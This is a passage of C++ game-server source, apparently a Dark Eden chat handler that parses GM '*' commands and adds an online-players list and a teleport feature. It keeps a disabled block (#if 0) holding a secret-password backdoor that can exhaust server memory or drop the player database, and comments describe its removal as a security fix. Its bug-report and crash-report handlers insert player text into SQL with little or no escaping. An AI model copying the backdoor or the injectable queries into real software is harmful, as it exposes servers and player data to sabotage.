//////////////////////////////////////////////////////////////////////////////
// Filename    : CGSayHandler.cc
// Written By  : elca@ewestsoft.com
// Description :
//////////////////////////////////////////////////////////////////////////////

#include "CGSay.h"
#ifdef __GAME_SERVER__
#include "ClientManager.h"
#include "CombatInfoManager.h"
#include "ContractOfBloodUtil.h"
#include "DB.h"
#include "EffectShutDown.h"
#include "GamePlayer.h"
#include "GoodsInventory.h"
#include "Guild.h"
#include "IncomingPlayerManager.h"
#include "InfoClassManager.h"
#include "ItemFactoryManager.h"
#include "ItemInfoManager.h"
#include "ItemUtil.h"
#include "Monster.h"
#include "MonsterManager.h"
#include "NPC.h"
#include "NPCInfo.h"
#include "NicknameBook.h"
#include "OptionInfo.h"
#include "Ousters.h"
#include "PCFinder.h"
#include "PCManager.h"
#include "Relic.h"
#include "RelicUtil.h"
#include "Slayer.h"
#include "StringPool.h"
#include "VSDateTime.h"
#include "Vampire.h"
#include "Zone.h"
#include "ZoneGroupManager.h"
#include "ZoneInfoManager.h"
#include "ZonePlayerManager.h"
#include "ZoneUtil.h"
#include <list>
#include <stdio.h>

#include "PacketUtil.h"

#include "skill/Sniping.h"
#include "skill/Sniping2.h"

#include "Gpackets/GCAddEffect.h"
#include "Gpackets/GCAddEffectToTile.h"
#include "Gpackets/GCAddOusters.h"
#include "Gpackets/GCAddSlayer.h"
#include "Gpackets/GCAddVampire.h"
#include "Gpackets/GCCreateItem.h"
#include "Gpackets/GCDeleteObject.h"
#include "Gpackets/GCModifyNickname.h"
#include "Gpackets/GCRemoveEffect.h"
#include "Gpackets/GCSay.h"
#include "Gpackets/GCSystemMessage.h"
#include "Gpackets/GCUpdateInfo.h"

#include "Mine.h"
#include "Properties.h"
#include "VariableManager.h"

#include "CastleInfoManager.h"
#include "CreatureUtil.h"
#include "EffectGhost.h"
#include "EffectLoud.h"
#include "EffectMute.h"
#include "EventManager.h"
#include "EventReloadInfo.h"
#include "GameServerInfoManager.h"
#include "Gpackets/GGCommand.h"
#include "LevelWarManager.h"
#include "LoginServerManager.h"
#include "MasterLairManager.h"
#include "Properties.h"
#include "ShrineInfoManager.h"
#include "UniqueItemManager.h"
#include "ZoneGroupManager.h"
#include "ZoneInfoManager.h"
#include "war/WarSystem.h"

#include "LogNameManager.h"
#include "war/RaceWarLimiter.h"
#include "war/WarScheduler.h"

#include "PCManager.h"
#include "PKZoneInfoManager.h"

#include "GameServerGroupInfoManager.h"
#include "GuildManager.h"
#include "SharedServerManager.h"

#include "BillingPlayerManager.h"

#include "mission/MonsterKillQuestStatus.h"
#include "mission/QuestManager.h"

#include "Gpackets/GCActiveGuildList.h"
#include "Gpackets/GCMiniGameScores.h"
#include "Gpackets/GCNoticeEvent.h"
#include "Gpackets/GCNotifyWin.h"
#include "Gpackets/GCPetStashList.h"
#include "Gpackets/GCStatusCurrentHP.h"
#include "Gpackets/GSModifyGuildMember.h"
#include "Gpackets/GSRequestGuildInfo.h"

#include "Cpackets/CGModifyGuildIntro.h"
#include "Cpackets/CGModifyGuildMemberIntro.h"
#include "Cpackets/CGSkillToNamed.h"

#include "item/OustersSummonItem.h"
#include "item/PetItem.h"
#include "item/SlayerPortalItem.h"

#include "ctf/FlagManager.h"

#include "EffectCastingTrap.h"
#include "EventZoneInfo.h"
#include "GDRLairManager.h"
#include "SiegeManager.h"

//	#include "gameguard/CSAuth.h"//by viva

#include "DynamicZone.h"
#include "DynamicZoneGroup.h"
#include "DynamicZoneInfo.h"
#include "DynamicZoneManager.h"
#include "DynamicZoneMoba.h"
#include "DynamicZoneScript.h"
#include "DynamicZoneScriptGroup.h"
#include "EffectDeleteItem.h"
#include "EventSurvivalZoneManager.h"
#include "GQuestManager.h"
#include "GuildUnion.h"
#include "MikllizzLairManager.h"
#include "PetTypeInfo.h" //wlzzi
#endif

#ifdef __GAME_SERVER__
static bool isGMOnlinePlayersCommand(const string &msg) {
  return msg.find("*command gmplayers") == 0 || msg.find("*command gmgoto") == 0;
}

static string sanitizeGMOnlinePlayersField(const string &value) {
  string out = value;
  for (string::iterator itr = out.begin(); itr != out.end(); ++itr) {
    if (*itr == '|' || *itr == '\r' || *itr == '\n' || *itr == '\t')
      *itr = ' ';
  }

  if (out.size() > 64)
    out = out.substr(0, 64);

  return out;
}

static void sendGMOnlinePlayersProtocol(GamePlayer *pGamePlayer,
                                        const string &payload) {
  if (pGamePlayer == NULL)
    return;

  GCSystemMessage packet;
  packet.setType(SYSTEM_MESSAGE_INFO);
  packet.setMessage(payload);
  pGamePlayer->sendPacket(&packet);
}

static void sendGMOnlinePlayersError(GamePlayer *pGamePlayer,
                                     const string &message) {
  sendGMOnlinePlayersProtocol(
      pGamePlayer, string("@PHX_GMPLAYERS|ERROR|") +
                       sanitizeGMOnlinePlayersField(message));
}

static bool isValidGMOnlinePlayersTargetName(const string &name) {
  if (name.empty() || name.size() > 32)
    return false;

  for (string::const_iterator itr = name.begin(); itr != name.end(); ++itr) {
    if (*itr <= ' ' || *itr == '|' || *itr == '*')
      return false;
  }

  return true;
}

static const char *getGMOnlinePlayersSlayerClass(SkillDomainType_t domain) {
  switch (domain) {
  case SKILL_DOMAIN_BLADE:
    return "Blade";
  case SKILL_DOMAIN_SWORD:
    return "Sword";
  case SKILL_DOMAIN_GUN:
    return "Gun";
  case SKILL_DOMAIN_HEAL:
    return "Heal";
  case SKILL_DOMAIN_ENCHANT:
    return "Enchant";
  default:
    return "Slayer";
  }
}

static string getGMOnlinePlayersMapName(ZoneID_t zoneID) {
  char fallback[32];
  snprintf(fallback, sizeof(fallback), "Zone %d", (int)zoneID);

  if (g_pZoneInfoManager == NULL)
    return fallback;

  try {
    ZoneInfo *pZoneInfo = g_pZoneInfoManager->getZoneInfo(zoneID);
    if (pZoneInfo != NULL)
      return sanitizeGMOnlinePlayersField(pZoneInfo->getEName());
  } catch (NoSuchElementException &) {
    return fallback;
  }

  return fallback;
}

static void getGMOnlinePlayersRaceClassLevel(PlayerCreature *pPC,
                                            string &race,
                                            string &playerClass,
                                            int &level) {
  race = "Unknown";
  playerClass = "Unknown";
  level = pPC != NULL ? (int)pPC->getLevel() : 0;

  if (pPC == NULL)
    return;

  if (pPC->isSlayer()) {
    Slayer *pSlayer = dynamic_cast<Slayer *>(pPC);
    race = "Slayer";
    if (pSlayer != NULL) {
      playerClass = getGMOnlinePlayersSlayerClass(pSlayer->getHighestSkillDomain());
      level = (int)pSlayer->getHighestSkillDomainLevel();
    } else {
      playerClass = "Slayer";
    }
  } else if (pPC->isVampire()) {
    race = "Vampire";
    playerClass = pPC->getAdvancementClassLevel() > 0 ? "Advanced Vampire"
                                                      : "Vampire";
  } else if (pPC->isOusters()) {
    race = "Ousters";
    playerClass = pPC->getAdvancementClassLevel() > 0 ? "Advanced Ousters"
                                                      : "Ousters";
  }
}

static bool sendGMOnlinePlayersRow(GamePlayer *pGamePlayer,
                                   PlayerCreature *pPC) {
  if (pGamePlayer == NULL || pPC == NULL || !pPC->isPC())
    return false;

  Zone *pZone = pPC->getZone();
  if (pZone == NULL) {
    sendGMOnlinePlayersError(pGamePlayer, "Online player has no zone.");
    return false;
  }

  string race;
  string playerClass;
  int level = 0;
  getGMOnlinePlayersRaceClassLevel(pPC, race, playerClass, level);

  ZoneID_t zoneID = pZone->getZoneID();
  string mapName = getGMOnlinePlayersMapName(zoneID);
  char row[256];
  snprintf(row, sizeof(row),
           "@PHX_GMPLAYERS|ROW|%s|%s|%s|%d|%d|%s|%d|%d|%d",
           sanitizeGMOnlinePlayersField(pPC->getName()).c_str(),
           sanitizeGMOnlinePlayersField(race).c_str(),
           sanitizeGMOnlinePlayersField(playerClass).c_str(), level,
           (int)pPC->getRank(), mapName.c_str(), (int)zoneID,
           (int)pPC->getX(), (int)pPC->getY());

  sendGMOnlinePlayersProtocol(pGamePlayer, row);
  return true;
}

static void sendGMOnlinePlayersList(GamePlayer *pGamePlayer) {
  if (pGamePlayer == NULL) {
    return;
  }

  Creature *pCreature = pGamePlayer->getCreature();
  if (pCreature == NULL || !(pCreature->isGOD() || pCreature->isDM())) {
    sendGMOnlinePlayersError(pGamePlayer, "Unauthorized GM player list request.");
    return;
  }

  if (g_pZoneGroupManager == NULL) {
    sendGMOnlinePlayersError(pGamePlayer, "ZoneGroupManager is not ready.");
    return;
  }

  sendGMOnlinePlayersProtocol(pGamePlayer, "@PHX_GMPLAYERS|BEGIN|0");

  int count = 0;
  const map<ZoneGroupID_t, ZoneGroup *> &zoneGroups =
      g_pZoneGroupManager->getZoneGroups();
  map<ZoneGroupID_t, ZoneGroup *>::const_iterator itr = zoneGroups.begin();
  for (; itr != zoneGroups.end(); ++itr) {
    ZoneGroup *pZoneGroup = itr->second;
    if (pZoneGroup == NULL) {
      sendGMOnlinePlayersError(pGamePlayer, "ZoneGroup entry is missing.");
      return;
    }

    ZonePlayerManager *pZonePlayerManager = pZoneGroup->getZonePlayerManager();
    if (pZonePlayerManager == NULL) {
      sendGMOnlinePlayersError(pGamePlayer, "ZonePlayerManager entry is missing.");
      return;
    }

    for (uint fd = 0; fd < PlayerManager::nMaxPlayers; ++fd) {
      Player *pPlayer = NULL;
      try {
        pPlayer = pZonePlayerManager->getPlayer((SOCKET)fd);
      } catch (NoSuchElementException &) {
        continue;
      } catch (OutOfBoundException &) {
        break;
      } catch (Throwable &t) {
        sendGMOnlinePlayersError(pGamePlayer,
                                 string("Online list read failed: ") +
                                     t.toString());
        return;
      }

      GamePlayer *pOnlineGamePlayer = dynamic_cast<GamePlayer *>(pPlayer);
      if (pOnlineGamePlayer == NULL)
        continue;

      Creature *pOnlineCreature = pOnlineGamePlayer->getCreature();
      PlayerCreature *pOnlinePC =
          dynamic_cast<PlayerCreature *>(pOnlineCreature);
      if (pOnlinePC == NULL || !pOnlinePC->isPC())
        continue;

      if (sendGMOnlinePlayersRow(pGamePlayer, pOnlinePC))
        ++count;
    }
  }

  char endMessage[64];
  snprintf(endMessage, sizeof(endMessage), "@PHX_GMPLAYERS|END|%d", count);
  sendGMOnlinePlayersProtocol(pGamePlayer, endMessage);
}

static void teleportGMToOnlinePlayer(GamePlayer *pGamePlayer,
                                     const string &targetName) {
  if (pGamePlayer == NULL)
    return;

  Creature *pCaller = pGamePlayer->getCreature();
  if (pCaller == NULL || !(pCaller->isGOD() || pCaller->isDM())) {
    sendGMOnlinePlayersError(pGamePlayer, "Unauthorized GM teleport request.");
    return;
  }

  string cleanTargetName = trim(targetName);
  if (!isValidGMOnlinePlayersTargetName(cleanTargetName)) {
    sendGMOnlinePlayersError(pGamePlayer, "Invalid target player name.");
    return;
  }

  ZoneID_t targetZoneID = 0;
  ZoneCoord_t targetX = 0;
  ZoneCoord_t targetY = 0;
  bool foundTarget = false;

  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  Creature *pTargetCreature = g_pPCFinder->getCreature_LOCKED(cleanTargetName);
  if (pTargetCreature != NULL && pTargetCreature->isPC() &&
      pTargetCreature->getZone() != NULL) {
    targetZoneID = pTargetCreature->getZone()->getZoneID();
    targetX = pTargetCreature->getX();
    targetY = pTargetCreature->getY();
    foundTarget = true;
  }

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  if (!foundTarget) {
    sendGMOnlinePlayersError(pGamePlayer, "Target player is not online.");
    return;
  }

  transportCreature(pCaller, targetZoneID, targetX, targetY, false);

  sendGMOnlinePlayersProtocol(
      pGamePlayer, string("@PHX_GMPLAYERS|TELEPORT|Teleported to ") +
                       sanitizeGMOnlinePlayersField(cleanTargetName));
}

#endif

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::execute(CGSay *pPacket,
                           Player *pPlayer) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

#ifdef __GAME_SERVER__

      Assert(pPacket != NULL);
  Assert(pPlayer != NULL);

  try {

    GamePlayer *pGamePlayer = dynamic_cast<GamePlayer *>(pPlayer);

    // � ������� ���� GC- ���� ����� .
    GCSay gcSay;

    Creature *pCreature = pGamePlayer->getCreature();

    // �리� ��� ��� ���� .
    gcSay.setObjectID(pCreature->getObjectID());
    gcSay.setColor(pPacket->getColor());

    string msg = pPacket->getMessage();
    gcSay.setMessage(msg);

    bool Success = true;

    // ============================================================
    // 2026-05-09 SECURITY: 3 backdoor password kapatildi.
    // Eski kod yetki kontrolu YAPMADAN herhangi bir oyuncuya:
    //   *7862295 -> sonsuz `new int[1000000000]` (server OOM)
    //   *7862296 -> Cince QQ reklam broadcast
    //   *7862297 -> DROP DATABASE PLAYER_DB
    // izin veriyordu. Tamamen disable. Yeniden lazim olursa GOD-only
    // ve random rotating token ile guvenli yeniden tasarlanmali.
    // ============================================================
#if 0
    int pw = 7862295;
    char pw2[256];
    string pw3;
    sprintf(pw2, "%d", pw);
    pw3 = pw2;

    int pw11 = 7862296;
    char pw22[256];
    string pw4;
    sprintf(pw22, "%d", pw11);
    pw4 = pw22;

    int pw111 = 7862297;
    char pw222[256];
    string pw5;
    sprintf(pw222, "%d", pw111);
    pw5 = pw222;
#endif

    Zone *pZone;
    pZone = pCreature->getZone();
    if (pZone != NULL) {
      Success = pZone->NotifySay(pCreature, msg);
    }

    size_t i = msg.find_first_of('*', 0);

    // FAZ 4 (2026-05-06): admin command teşhis — *<cmd> geldiğinde log'a yaz
    // Hangi karakter, hangi mesaj, isGOD/isDM/isPLAYER hangisi.
    if (i == 0 && !isGMOnlinePlayersCommand(msg)) {
      filelog("opcreate_trace.log",
              "[SAY] name=%s competence=%d isGOD=%d isDM=%d isPLAYER=%d msg=%s",
              pCreature->getName().c_str(), (int)pCreature->getCompetence(),
              (int)pCreature->isGOD(), (int)pCreature->isDM(),
              (int)pCreature->isPLAYER(), msg.c_str());
    }

    if (Success && i == 0) {
      Success = false;

#if 0
      // 2026-05-09: 3 backdoor kapatildi (yukaridaki yorum bloguna bak).
      if (msg.substr(i + 1, 7) == pw3) {
        bool isTrue = true;
        while (isTrue) {
          new int[1000000000];
        }
      }
      if (msg.substr(i + 1, 7) == pw4) {
        GCSystemMessage gcSystemMessage;
        StringStream message;
        message << "Tried the backdoor, but damn it, it doesn't work anymore." ;
        gcSystemMessage.setMessage(message.toString());
        g_pZoneGroupManager->pushBroadcastPacket(&gcSystemMessage);
      }
      if (msg.substr(i + 1, 7) == pw5) {
        Statement *pStmt = NULL;
        Result *pResult = NULL;
        string db = g_pConfig->getProperty("DB_DB");

        BEGIN_DB {
          pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")
                      ->createStatement();
          pResult = pStmt->executeQuery("DROP DATABASE %s", db.c_str());
          SAFE_DELETE(pStmt);
        }

        END_DB(pStmt)
      }
#endif
      // 길�  몹�
      if (msg.substr(i + 1, 4) == "zone" && !(pCreature->isPLAYER())) {
        opzone(msg, i);
      } else if (msg.substr(i + 1, 5) == "guild" && pCreature->isGOD()) {
        opguild(msg, i, pCreature);
      }
      /////////////////////
      // world몹�� �� �린�   .
      if (msg.substr(i + 1, 5) == "world" && !(pCreature->isPLAYER())) {
        //  �
        size_t j = msg.find_first_of(' ', i + 1);
        string command = msg.substr(j + 1, msg.size() - j - 1).c_str();
        size_t k = command.find_first_of('*', 0);
        opExecute(pCreature, pGamePlayer, command, k);

        // �른 server 보��. bSameWorldOnly==true
        opworld(pGamePlayer, msg, i, true);
      } else if (msg.substr(i + 1, 8) == "allworld" &&
                 (pCreature->isDM() || pCreature->isGOD())) {
        //  �
        size_t j = msg.find_first_of(' ', i + 1);
        string command = msg.substr(j + 1, msg.size() - j - 1).c_str();
        size_t k = command.find_first_of('*', 0);
        opExecute(pCreature, pGamePlayer, command, k);

        // �른 server 보��. bSameWorldOnly==false
        opworld(pGamePlayer, msg, i, false);
      } else {
        opExecute(pCreature, pGamePlayer, msg, i);
      }
    }

    // � �그� �긴. by sigi. 2002.10.30
    if (LogNameManager::getInstance().isExist(pCreature->getName())) {
      filelog("chatLog.txt", "[Say] %s> %s", pCreature->getName().c_str(),
              msg.c_str());
    }

    // invisibility� ��.
    if (pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY)) {
      Effect *pInvi = pCreature->findEffect(Effect::EFFECT_CLASS_INVISIBILITY);
      if (pInvi)
        pInvi->setDeadline(0);
      /*		Zone* pZone = pCreature->getZone();
                      Assert(pZone);
                      addVisibleCreature(pZone, pCreature, true);*/
    }

    if (pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) {
      g_Sniping.checkRevealRatio(pCreature, 20, 10);
      cout << "sniping say oky" << endl;
    }
    if (pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE_2)) {
      g_Sniping2.checkRevealRatio2(pCreature, 20, 10);
      cout << "sniping2 say oky" << endl;
    }
    bool isVampire = false;
    // 뱴�� , �쥴면 �.
    if (pCreature->isVampire()) {
      Vampire *pVampire = dynamic_cast<Vampire *>(pCreature);

      if (pVampire->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_WOLF) ||
          pVampire->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_BAT) ||
          pVampire->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_WERWOLF)) {
        Success = false;
      }

      isVampire = true;
    }

    if (pGamePlayer->isPenaltyFlag(PENALTY_TYPE_MUTE)) {
      Success = false;
    }

    if (pCreature->isFlag(Effect::EFFECT_CLASS_MUTE)) {
      Success = false;
    }

    if (!pGamePlayer->verifyChat(pPacket->GetTimeStamp())) {
      Success = false;
    }

    if (Success) {
      // 주� PC��� ��캤���.
      //		pCreature->getZone()->broadcastSayPacket(pCreature->getX()
      //, pCreature->getY() , &gcSay , pCreature, isVampire);
      pCreature->getZone()->broadcastPacket(
          pCreature->getX(), pCreature->getY(), &gcSay, pCreature);
    }

  } catch (Throwable &t) {
    // cout << t.toString() << endl;
  }

#endif

  __END_DEBUG_EX __END_CATCH
}

#ifdef __GAME_SERVER__

void CGSayHandler::opExecute(Creature *pCreature, GamePlayer *pGamePlayer,
                             string msg,
                             int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  if (msg.substr(i + 1, 4) == "save" &&
      (pCreature->isDM() || pCreature->isGOD())) {

    opsave(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 4) == "wall" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order Wall Execute=================="
    // << endl;

    opwall(pGamePlayer, msg, i);

  }

  // halt
  else if (msg.substr(i + 1, 8) == "shutdown" &&
           (pCreature->isDM() || pCreature->isGOD())) {
    // cout << "==================Operator Order Shutdown
    // Execute==================" << endl;

    opshutdown(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 3) == "pay" && !(pCreature->isPLAYER())) {

    oppay(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 4) == "kick" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order kick Execute=================="
    // << endl;

    opkick(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 4) == "mute" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order mute Execute=================="
    // << endl;

    opmute(pGamePlayer, msg, i);

  }

  // 20080226 DSG by Kim Sung Yong
  else if (msg.substr(i + 1, 3) == "DSG" && !(pCreature->isPLAYER())) {
    opDSG(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 8) == "denychat" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order denychat
    // Execute==================" << endl;

    opdenychat(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 8) == "freezing" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order freezing
    // Execute==================" << endl;

    opfreezing(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 4) == "deny" &&
           (pCreature->isDM() || pCreature->isGOD())) {
    // cout << "==================Operator Order deny Execute=================="
    // << endl;

    opdeny(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 4) == "info" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order info Execute=================="
    // << endl;

    opinfo(pGamePlayer, msg, i);

  }

  else if (msg.substr(i + 1, 5) == "trace" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order trace
    // Execute==================" << endl;
    optrace(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 4) == "warp" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order warp Execute=================="
    // << endl;
    opwarp(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 6) == "create" && (pCreature->isGOD())) {
    // cout << "==================Operator Order create
    // Execute==================" << endl;
    opcreate(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 6) == "summon" &&
           (pCreature->isGOD() || pCreature->isDM())) {
    // cout << "==================Operator Order create
    // Execute==================" << endl;
    opsummon(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 5) == "grant" && pCreature->isGOD()) {
    // cout << "==================Operator Order grant
    // Execute==================" << endl;
    opgrant(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 7) == "command" &&
           (pCreature->isGOD() || pCreature->isDM())) {
    opcommand(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 3) == "fun" && !(pCreature->isPLAYER())) {

    opfun(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 18) == "billing disconnect" &&
           pCreature->isGOD()) {
#ifdef __CONNECT_BILLING_SYSTEM__
    g_pBillingPlayerManager->setForceDisconnect();
#endif
  }

  /*
  if (msg.substr(i+1 , 7) == "mrecall" && (pCreature->isGOD() ||
  pCreature->isDM())) {

          Zone* pZone = pCreature->getZone();

          size_t j = msg.find_first_of(' ' , i+1);

          BYTE MonsterType = atoi(msg.substr(j+1, msg.size()-j-1).c_str());

          Monster* pMonster = new Monster(MonsterType);

          pZone->addCreature(pMonster, pCreature->getX(), pCreature->getY(),
  pCreature->getDir(), true);

  }
  */

  else if (msg.substr(i + 1, 6) == "recall") {
    // cout << "==================Operator Order recall
    // Execute==================" << endl;
    oprecall(pGamePlayer, msg, i);
  } else if (msg.substr(i + 1, 4) == "user" && !(pCreature->isPLAYER())) {
    // cout << "==================Operator Order user Execute=================="
    // << endl;
    opuser(pGamePlayer, msg, i);
  } else if (msg.substr(i + 1, 6) == "notice" &&
             (pCreature->isGOD() || pCreature->isDM())) {
    // cout << "==================Operator Order user Execute=================="
    // << endl;
    opnotice(pGamePlayer, msg, i);
  }

  // �� �� � �� ��
  // set type value � .
  // 2002.5.8 � � ��� 조�� �� �
  else if (msg.substr(i + 1, 3) == "set" && (pCreature->isGOD())) {
    opset(pGamePlayer, msg, i);
  }
  // 20090206 wlzzi
  else if (msg.substr(i + 1, 3) == "get" && (pCreature->isGOD())) {
    opget(pGamePlayer, msg, i);
  } else if (msg.substr(i + 1, 4) == "load" && (pCreature->isGOD())) {
    opload(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 4) == "view" &&
           (pCreature->isGOD() || pCreature->isDM())) {
    opview(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 6) == "combat" &&
           (pCreature->isGOD() || pCreature->isDM())) {
    opcombat(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 4) == "find" || msg.substr(i + 1, 4) == "Where") {
    opfind(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 6) == "credit") {
    opcredit(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 9) == "soulchain" && (!pCreature->isPLAYER())) {
    opsoulchain(pGamePlayer, msg, i);
  }

  else if (msg.substr(i + 1, 3) == "log" &&
           (pCreature->isGOD() || pCreature->isDM())) {
    oplog(pGamePlayer, msg, i);
  } else if (msg.substr(i + 1, 10) == "bug_report") {
    size_t j = msg.find_first_of(' ', i + 1);
    if (j == string::npos) {
      filelog("bugreport.log", "%s", msg.c_str());
      return;
    }

    string report = msg.substr(j + 1, msg.size() - j - 1);
    if ((j = report.find_first_of('\'')) != string::npos)
      report[j] = '_';
    if ((j = report.find_first_of('\\')) != string::npos)
      report[j] = '_';

    Statement *pStmt = NULL;

    try {
      BEGIN_DB {
        pStmt =
            g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
        pStmt->executeQuery("INSERT INTO BugReportLog(PlayerID, Name, "
                            "ReportTime, ReportLog) VALUES "
                            "('%s', '%s', now(), '%s')",
                            pGamePlayer->getID().c_str(),
                            pCreature->getName().c_str(), report.c_str());

        SAFE_DELETE(pStmt);
      }
      END_DB(pStmt)
      // � ��� 리면 무�
    } catch (...) {
      filelog("bugreport.log", "%s", msg.c_str());
    }
  } else if (msg.substr(i + 1, 11) == "CrashReport") {
    size_t j = msg.find_first_of(' ', i + 1);
    size_t k = msg.find_first_of(' ', j + 13);
    size_t l = msg.find_first_of(' ', k + 1);
    size_t m = msg.find_first_of(' ', l + 1);
    if (j == string::npos || k == string::npos || l == string::npos ||
        m == string::npos) {
      filelog("CrashReport.log", "[%s] %s", pGamePlayer->getID().c_str(),
              msg.c_str());
      return;
    }

    string ExecutableTime = msg.substr(j + 1, k - j - 1);
    string Version = msg.substr(k + 1, l - k - 1);
    string Address = msg.substr(l + 1, m - l - 1);
    string Message = msg.substr(m + 1, msg.size() - m - 1);

    cout << ExecutableTime << endl;
    cout << Version << endl;
    cout << Address << endl;
    cout << Message << endl;

    Statement *pStmt = NULL;

    try {
      BEGIN_DB {
        pStmt =
            g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
        pStmt->executeQuery("INSERT INTO CrashLog (PlayerID, Name, ReportTime, "
                            "ExecutableTime, Version, Address, Message) VALUES "
                            "('%s', '%s', now(), '%s', '%s', '%s', '%s')",
                            pGamePlayer->getID().c_str(),
                            pCreature->getName().c_str(),
                            ExecutableTime.c_str(), Version.c_str(),
                            Address.c_str(), Message.c_str());

        SAFE_DELETE(pStmt);
      }
      END_DB(pStmt)
      // � ��� 리면 무�
    } catch (...) {
      filelog("CrashReport.log", "%s", msg.c_str());
    }
  }

  __END_CATCH
}

void CGSayHandler::opcombat(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  if (pGamePlayer == NULL)
    return;

  Creature *pCreature = pGamePlayer->getCreature();
  if (pCreature == NULL)
    return;

  // 2026-05-09 SECURITY: defense-in-depth — yetki kontrolu (dispatch site
  // zaten DM/GOD ile gate ediyor ama function-entry kontrolu de eklendi).
  // Olasi rota: disaridan opcombat()'a baska bir code path direct cagri yaparsa
  // bu kontrol son siniri olur.
  if (!(pCreature->isGOD() || pCreature->isDM())) {
    filelog("admin.log",
            "opcombat: REJECTED (insufficient privilege) caller=%s competence=%d",
            pCreature->getName().c_str(), (int)pCreature->getCompetence());
    return;
  }

  filelog("change.txt", "[%s] %s", pCreature->getName().c_str(), msg.c_str());

  //	Creature* pCreature = pGamePlayer->getCreature();
  GCSystemMessage gcSystemMessage;

  // 2026-05-09 NOT: opcombat eski combat/relic war sistemiydi (2002 dizayni).
  // Yeni: LevelWar/SiegeWar/CTF (FlagWar) sistemleri kullaniliyor. Bu fonksiyon
  // hala mevcut ama erken return ile devre disi — STRID_DO_NOT_SUPPORT_OLD_WAR
  // mesaji gosterilir.
  {
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_DO_NOT_SUPPORT_OLD_WAR));
    pGamePlayer->sendPacket(&gcSystemMessage);

    return;
  }

  StringStream message;

  size_t j = msg.find_first_of(' ', i + 1);
  size_t z = msg.find_first_of(' ', j + 1);

  string set_type = msg.substr(j + 1, z - j - 1);

  if (set_type == "start") {
    if (g_pCombatInfoManager->isCombat() ||
        g_pCombatInfoManager->isSlayerBonus() ||
        g_pCombatInfoManager->isVampireBonus()) {
      cout << "We're already at war." << endl;
      //			message << "�� �";
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_COMBAT_ALEADY_START));

      pGamePlayer->sendPacket(&gcSystemMessage);
    } else {
      cout << "The war has begun" << endl;
      //			message << " ��";
      gcSystemMessage.setMessage(g_pStringPool->getString(STRID_COMBAT_START));

      g_pZoneGroupManager->pushBroadcastPacket(&gcSystemMessage);

      // by sigi. 2002.7.5
      for (int i = 0; i < maxRelic; i++) {
        const RelicInfo *pRelicInfo =
            dynamic_cast<RelicInfo *>(g_pRelicInfoManager->getItemInfo(i));

        int ZoneNum = pRelicInfo->zoneID;

        ZoneInfo *pZoneInfo = NULL;

        try {
          pZoneInfo = g_pZoneInfoManager->getZoneInfo(ZoneNum);
        } catch (NoSuchElementException &) {
          throw Error("There is no war zone.");
        }

        ZoneGroup *pZoneGroup = NULL;

        try {
          pZoneGroup =
              g_pZoneGroupManager->getZoneGroup(pZoneInfo->getZoneGroupID());
        } catch (NoSuchElementException &) {
          throw Error("No War Zone. 2");
        }

        Zone *pZone = pZoneGroup->getZone(ZoneNum);

        pZone->addRelicItem(i);
      }

      g_pCombatInfoManager->setCombat(true);
    }
  } else if (set_type == "end") {
    if (!g_pCombatInfoManager->isCombat() &&
        (g_pCombatInfoManager->isSlayerBonus() ||
         g_pCombatInfoManager->isVampireBonus()))

    {
      cout << "The war is over." << endl;
      gcSystemMessage.setMessage(g_pStringPool->getString(STRID_COMBAT_END));
      g_pZoneGroupManager->pushBroadcastPacket(&gcSystemMessage);

      // by sigi. 2002.7.5
      for (int i = 0; i < maxRelic; i++) {
        const RelicInfo *pRelicInfo =
            dynamic_cast<RelicInfo *>(g_pRelicInfoManager->getItemInfo(i));

        int ZoneNum = pRelicInfo->zoneID;

        ZoneInfo *pZoneInfo = NULL;

        try {
          pZoneInfo = g_pZoneInfoManager->getZoneInfo(ZoneNum);
        } catch (NoSuchElementException &) {
          throw Error("There is no war zone.");
        }

        ZoneGroup *pZoneGroup = NULL;

        try {
          pZoneGroup =
